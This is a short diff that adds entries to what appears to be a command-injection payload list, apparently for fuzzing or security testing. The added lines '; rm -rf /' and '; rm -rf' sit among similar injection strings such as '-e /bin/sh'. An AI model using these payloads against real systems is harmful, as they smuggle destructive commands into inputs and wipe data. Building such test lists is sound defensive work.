@@ -41,6 +41,8 @@
 }; cat
 }; /cat
 }; rm -rf /
+; rm -rf /
+; rm -rf
 /usr/bin/env bash
 ifconfig
 -e /bin/sh
